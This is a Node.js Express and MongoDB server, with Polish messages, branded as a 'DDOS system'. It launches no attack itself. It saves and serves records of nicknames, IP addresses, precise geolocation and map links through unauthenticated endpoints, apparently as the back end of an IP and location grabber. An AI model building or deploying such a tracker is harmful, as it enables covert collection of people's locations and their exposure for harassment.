const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/ddos-attacks';

console.log('🔄 Łączę z MongoDB...');

mongoose.connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log('✅ Połączono z MongoDB'))
.catch(err => {
    console.error('❌ Błąd MongoDB:', err.message);
    console.log('💡 Używam bazy w pamięci RAM');
});

// Zaktualizowany schema z nickami
const attackSchema = new mongoose.Schema({
    yourNick: {
        type: String,
        required: true
    },
    targetNick: {
        type: String,
        required: true
    },
    ip: String,
    location: {
        country: String,
        city: String,
        region: String,
        postal: String,
        lat: Number,
        lon: Number
    },
    timestamp: {
        type: Date,
        default: Date.now
    },
    userAgent: String,
    mapsLink: String,
    status: {
        type: String,
        default: 'active',
        enum: ['pending', 'active', 'completed', 'failed']
    }
});

const Attack = mongoose.model('Attack', attackSchema);

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

app.get('/health', async (req, res) => {
    try {
        const count = await Attack.countDocuments();
        res.json({
            status: 'OK',
            message: 'DDOS System działa',
            database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
            totalAttacks: count,
            activeAttacks: await Attack.countDocuments({ status: 'active' }),
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.json({
            status: 'ERROR',
            message: error.message
        });
    }
});

app.post('/api/save', async (req, res) => {
    try {
        const { yourNick, targetNick, ip, location, userAgent, mapsLink } = req.body;
        
        // Sprawdź czy podano nicki
        if (!yourNick || !targetNick) {
            return res.status(400).json({
                success: false,
                error: 'Podaj oba nicki!'
            });
        }
        
        const attack = new Attack({
            yourNick: yourNick,
            targetNick: targetNick,
            ip: ip || 'Nieznany',
            location: location || {
                country: 'Nieznany',
                city: 'Nieznane',
                region: 'Nieznane',
                postal: '00-000',
                lat: 0,
                lon: 0
            },
            userAgent: userAgent || 'Nieznany',
            mapsLink: mapsLink || 'https://www.google.com/maps',
            timestamp: new Date(),
            status: 'active'
        });
        
        const savedAttack = await attack.save();
        
        console.log('💣 ZAPISANO ATAK DDOS:', {
            id: savedAttack._id,
            atakujący: savedAttack.yourNick,
            cel: savedAttack.targetNick,
            ip: savedAttack.ip,
            czas: savedAttack.timestamp,
            status: savedAttack.status
        });
        
        res.json({
            success: true,
            message: `Atak DDOS na ${targetNick} został rozpoczęty!`,
            id: savedAttack._id,
            data: {
                yourNick: savedAttack.yourNick,
                targetNick: savedAttack.targetNick,
                ip: savedAttack.ip,
                city: savedAttack.location.city,
                country: savedAttack.location.country,
                timestamp: savedAttack.timestamp,
                status: savedAttack.status
            }
        });
        
    } catch (error) {
        console.error('❌ Błąd zapisu ataku:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/data', async (req, res) => {
    try {
        const allAttacks = await Attack.find()
            .sort({ timestamp: -1 })
            .limit(100);
        
        res.json({
            success: true,
            count: allAttacks.length,
            data: allAttacks
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/stats', async (req, res) => {
    try {
        const totalAttacks = await Attack.countDocuments();
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const attacksToday = await Attack.countDocuments({
            timestamp: { $gte: today }
        });
        
        const topAttackers = await Attack.aggregate([
            { $group: { _id: "$yourNick", count: { $sum: 1 } } },
            { $sort: { count: -1 } },
            { $limit: 10 }
        ]);
        
        const topTargets = await Attack.aggregate([
            { $group: { _id: "$targetNick", count: { $sum: 1 } } },
            { $sort: { count: -1 } },
            { $limit: 10 }
        ]);
        
        res.json({
            success: true,
            totalAttacks: totalAttacks,
            attacksToday: attacksToday,
            topAttackers: topAttackers,
            topTargets: topTargets
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.delete('/api/data/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const result = await Attack.findByIdAndDelete(id);
        
        if (!result) {
            return res.status(404).json({
                success: false,
                error: 'Nie znaleziono ataku'
            });
        }
        
        res.json({
            success: true,
            message: 'Atak usunięty z bazy'
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.delete('/api/clear-all', async (req, res) => {
    try {
        const result = await Attack.deleteMany({});
        
        res.json({
            success: true,
            message: `Usunięto ${result.deletedCount} ataków z bazy`
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('='.repeat(60));
    console.log('💣 SYSTEM DDOS URUCHOMIONY');
    console.log('='.repeat(60));
    console.log(`🌐 URL: http://localhost:${PORT}`);
    console.log(`📊 Health: http://localhost:${PORT}/health`);
    console.log(`📈 Stats: http://localhost:${PORT}/api/stats`);
    console.log(`💾 MongoDB: ${MONGODB_URI}`);
    console.log(`📁 Database: ${mongoose.connection.readyState === 1 ? 'Połączono' : 'Brak połączenia'}`);
    console.log('='.repeat(60));
    console.log('='.repeat(60));
});